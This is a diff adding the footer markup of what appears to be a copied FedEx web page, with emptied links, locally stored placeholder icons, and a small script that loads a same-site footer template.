+													<a href="" title="About FedEx" target="_self" class="fxg-link fxg-link--gray">About
+														FedEx</a>
+												</div>
+												<div class="link">
+													<a href="" title="Our Portfolio" target="_self" class="fxg-link fxg-link--gray">Our Portfolio</a>
+												</div>
+												<div class="link">
+													<a href="" title="Investor Relations" target="_self" class="fxg-link fxg-link--gray" style="white-space: nowrap;">Investor Relations</a>
+												</div>
+												<div class="link">
+													<a href="" title="FedEx Careers" target="_self" class="fxg-link fxg-link--gray">Careers</a>
+												</div>
+											</div>
+											
+												<div class="link fxg-col2-nt">
+													<a href="" title="FedEx Blog" target="_self" class="fxg-link fxg-link--gray">FedEx Blog</a>
+												</div>
+												<div class="link fxg-col2-nt">
+													<a href="" title="Corporate Responsibility" target="_self" class="fxg-link fxg-link--gray" style="white-space: nowrap;">Corporate Responsibility</a>
+												</div>
+												<div class="link fxg-col2-nt">
+													<a href="" title="News Room" target="_self" class="fxg-link fxg-link--gray">Newsroom</a>
+												</div>
+												<div class="link fxg-col2-nt">
+													<a href="" title="Contact Us" target="_self" class="fxg-link fxg-link--gray">Contact Us</a>
+												</div>
+											
+										</div>
+									</div>
+								</div>
+
+
+								<div class="fxg-col fxg-col--fxg-col--mt20 fxg-col-- col-sm-3">
+									<div class="title section">
+										<div tabindex="0" class="fxg-title fxg-title--default   " style="text-align: left;">More From FedEx</div>
+									</div>
+									<div class="link">
+										<a href="" title="FedEx Compatible" target="_self" class="fxg-link fxg-link--gray">FedEx Compatible</a>
+									</div>
+									<div class="link">
+										<a href="" title="Developer Resource Center" target="_self" class="fxg-link fxg-link--gray">Developer Resource Center</a>
+									</div>
+									<div class="link">
+										<a href="" title="FedEx Cross Border" target="_self" class="fxg-link fxg-link--gray">FedEx Cross Border</a>
+									</div>
+								</div>
+
+								<div class="fxg-col fxg-col--fxg-col--mt20 fxg-col-- col-sm-2">
+
+
+								</div>
+
+
+
+								<div class="fxg-col fxg-col--fxg-col--mt20 fxg-col-- col-sm-3">
+									<div class="title">
+										<div class="fxg-title fxg-title--default   " style="text-align: left;">Language</div>
+									</div>
+									<!-- LANGUAGE DROPDOWN START -->
+									<div class="language_dropdown">
+										<div class="icon_link">
+											<a href="" target="_self" class="fxg-link"><img src="fedx/sprite-placeholder.png" alt="Change Country" class="fxg-icon fxg-icon--flag-default">Change Country</a>
+										</div>
+										<!--Bootstrap dropdown for uniformity across all OS's-->
+										<div class="dropdown fxg-bootstrap-dropdown" style="float: none;">
+											<button class="dropdown-toggle" type="button" id="dropdownMenu" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
+												English <span class="fxg-icon"></span>
+											</button>
+											<ul class="dropdown-menu" aria-labelledby="dropdownMenu">
+												<li><a href="" target="_self">Español</a></li>
+											</ul>
+										</div>
+									</div>
+									<!-- LANGUAGE DROPDOWN END -->
+								</div>
+							</div>
+						</div>
+						<!-- COLUMN CONTROL END -->
+						<div class="hr">
+							<hr class="fxg-mobile--hide">
+						</div>
+					</div>
+				</div>
+				<!-- BEGIN SOCIAL BAR -->
+				<div class="fxg-footer__social">
+					<div class="fxg-wrapper container">
+						<!-- COLUMN CONTROL START -->
+						<div class="column_control">
+							<div class="row">
+								<!-- 2 Columns -->
+								<div class="fxg-col fxg-col--fxg-col--mt20 fxg-col-- col-sm-8">
+									<div class="title">
+										<div class="fxg-title fxg-title--default" style="text-align: left;">Follow FedEx</div>
+									</div>
+									<div class="icon_link">
+										<a href="" target="_self" title="Newsletter Signup" class="fxg-link"><img src="fedx/sprite-placeholder.png" alt="Newsletter Signup" class="fxg-icon fxg-icon--email"></a>
+									</div>									<div class="icon_link">
+										<a href="" target="_self" class="fxg-link"><img src="fedx/sprite-placeholder.png" alt="Facebook" class="fxg-icon fxg-icon--facebook"></a>
+									</div>
+									<div class="icon_link">
+										<a href="" target="_self" class="fxg-link"><img src="fedx/sprite-placeholder.png" alt="Twitter" class="fxg-icon fxg-icon--twitter"></a>
+									</div>
+									<div class="icon_link">
+										<a href="" target="_self" class="fxg-link"><img src="fedx/sprite-placeholder.png" alt="Instagram" class="fxg-icon fxg-icon--instagram   "></a>
+									</div>
+									<div class="icon_link">
+										<a href="" target="_self" class="fxg-link"><img src="fedx/sprite-placeholder.png" alt="LinkedIn" class="fxg-icon fxg-icon--linkedin   "></a>
+									</div>
+									<div class="icon_link">
+										<a href="" target="_self" class="fxg-link"><img src="fedx/sprite-placeholder.png" alt="YouTube" class="fxg-icon fxg-icon--youtube   "></a>
+									</div>
+									<!--<div class="icon_link">
+                                            <a href="#" target="_self" class="fxg-link"><img src="//www.fedex.com/images/legacy/sprite-placeholder.png" alt="Tumblr" class="fxg-icon fxg-icon--tumblr   "/></a>
+                                        </div>-->
+									<div class="icon_link">
+										<a href="" target="_self" class="fxg-link"><img src="fedx/sprite-placeholder.png" alt="Pinterest" class="fxg-icon fxg-icon--pinterest"></a>
+									</div>
+									<div class="icon_link">
+										<a href="" target="_self" class="fxg-link"><img src="fedx/sprite-placeholder.png" alt="Google Plus" class="fxg-icon fxg-icon--googleplus"></a>
+									</div>
+								</div>
+
+							</div>
+						</div>
+						<!-- COLUMN CONTROL END -->
+					</div>
+				</div>
+				<!-- END SOCIAL BAR -->
+				<!-- BEGIN COPYRIGHT BAR -->
+				<div class="fxg-copyright">
+					<div class="fxg-wrapper container">
+						<div class="column_control">
+							<div class="row">
+								<!-- 2 Columns -->
+								<div class="fxg-col fxg-col-- fxg-col-- col-sm-4">
+									<div class="title">
+										<div class="fxg-title fxg-title--default" style="text-align: left;">© FedEx 1995-2018
+											</div>
+									</div>
+								</div>
+								<div class="row">
+        
+                                <!-- 2 Columns -->
+                                <div class="fxg-col fxg-col-- fxg-col--  ">
+                                    <div class="link section">
+                                        <a href="" alt="Feedback" target="_self" class="fxg-link default fxg-copyright-feedback-link    ">Feedback</a>
+                                        <span class="fxg-link__separator    "> | </span>
+                                    </div>
+
+
+                                </div>
+
+                                <div class="fxg-col fxg-col-- fxg-col--  ">
+                                    <div class="link section">
+                                        <a href="" alt="Site Map" target="_self" class="fxg-link default     ">Site Map</a>
+                                        <span class="fxg-link__separator    "> | </span>
+                                    </div>
+                                    <div class="link section">
+                                        <a href="" alt="Terms of Use" target="_self" class="fxg-link default     ">Terms of Use</a>
+                                        <span class="fxg-link__separator    "> | </span>
+                                    </div>
+                                    <div class="link section">
+                                        <a href="" alt="Security &amp; Privacy" target="_self" class="fxg-link default     ">Security &amp; Privacy</a>
+    
+                                    </div>
+
+
+                                </div>
+        
+
+        
+                                </div>
+							</div>
+						</div>
+						<!-- COLUMN CONTROL END -->
+					</div>
+				</div>
+			</footer>
+		</div>
+	</div>
+</div>
+<!-- END FOOTER -->
+
+
+<!-- </noindex> -->
+
+</div>
+<script>
+
+
+function loadDoc(file) {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+     document.getElementById("aux").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("GET", file, true);
+  xhttp.send();
+}
+	
+if (vf == 0) {
+
+   if ( /MSIE 7/i.test(navigator.userAgent) || /MSIE 8/i.test(navigator.userAgent) || /\/labelportal\//.test(location.href) ) {
+    loadDoc("/templates/components/footers/us/gl_old.html");
+  } else {
+    loadDoc("/templates/components/footers/us/gl_new.html");
+  }
+}
+
+</script>
+ 
+			 
+        </div>
+       
+        <!-- LAYOUT: CLOSE CONTAINER -->
+        <!-- Browser Check -->
+		 
+	
+
+
+
+
+</body></html>
